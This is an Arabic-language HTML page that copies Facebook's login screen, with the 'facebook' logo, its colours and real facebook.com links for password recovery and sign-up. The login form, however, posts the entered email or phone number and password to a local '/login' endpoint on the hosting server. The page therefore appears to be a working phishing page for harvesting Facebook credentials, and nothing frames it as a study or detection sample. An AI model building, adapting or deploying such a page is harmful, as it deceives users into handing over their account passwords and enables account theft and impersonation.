<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فيسبوك - تسجيل الدخول أو الاشتراك</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: #f0f2f5;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 0 10px;
        }
        .container {
            width: 100%;
            max-width: 360px; /* Adjusted for mobile */
            padding: 20px;
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
            text-align: center;
            position: relative;
            min-height: 800px; /* Significantly increased height for mobile */
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .logo {
            font-size: 36px; /* Adjusted for mobile */
            color: #1877f2;
            font-weight: bold;
            margin-bottom: 20px;
        }
        input {
            width: calc(100% - 22px);
            padding: 14px;
            margin-bottom: 12px; /* Adjusted for mobile */
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            box-sizing: border-box;
            transition: border-color 0.3s, box-shadow 0.3s;
        }
        input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 5px rgba(24, 119, 242, 0.2);
            outline: none;
        }
        button {
            width: calc(100% - 22px);
            padding: 14px;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s, transform 0.3s, box-shadow 0.3s;
        }
        .login-button {
            background: #1877f2;
        }
        .login-button:hover {
            background: #165eab;
            transform: scale(1.02);
            box-shadow: 0 0 8px rgba(24, 119, 242, 0.3);
        }
        .create-account-button {
            background: #42b72a; /* Facebook green */
            margin-top: 10px;
        }
        .create-account-button:hover {
            background: #36a420;
            transform: scale(1.02);
            box-shadow: 0 0 8px rgba(66, 183, 42, 0.3);
        }
        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #65676b;
            line-height: 1.5;
            text-align: center;
        }
        .footer a {
            color: #1877f2;
            text-decoration: none;
            display: inline-block;
            margin: 5px 0;
            font-weight: 500;
            transition: color 0.3s;
        }
        .footer a:hover {
            text-decoration: underline;
            color: #165eab;
        }
        .footer .line-green {
            border-top: 1px solid #ddd;
            margin: 15px 0;
            height: 1px;
            background: #ddd;
        }
        .footer .create-account {
            display: block;
            margin-top: 15px;
            font-size: 16px;
        }

        /* Responsive styles for mobile devices */
        @media (max-width: 480px) {
            .container {
                padding: 15px;
                max-width: 100%;
                box-shadow: 0 0 15px rgba(0,0,0,0.15);
                min-height: 850px; /* Further increased height for mobile */
            }
            .logo {
                font-size: 32px;
                margin-bottom: 15px;
            }
            input {
                padding: 12px;
                font-size: 14px;
            }
            button {
                padding: 12px;
                font-size: 14px;
            }
            .footer .create-account {
                margin-top: 15px;
                font-size: 14px;
            }
            .footer .line-green {
                margin: 10px 0;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" name="password" placeholder="كلمة المرور" required>
            <button type="submit" class="login-button">تسجيل الدخول</button>
        </form>
        <div class="footer">
            <a class="forgot-password" href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">نسيت كلمة المرور؟</a>
            <div class="line-green"></div>
            <button class="create-account-button" onclick="window.location.href='https://www.facebook.com/r.php'">إنشاء حساب جديد</button>
        </div>
    </div>
</body>
</html>
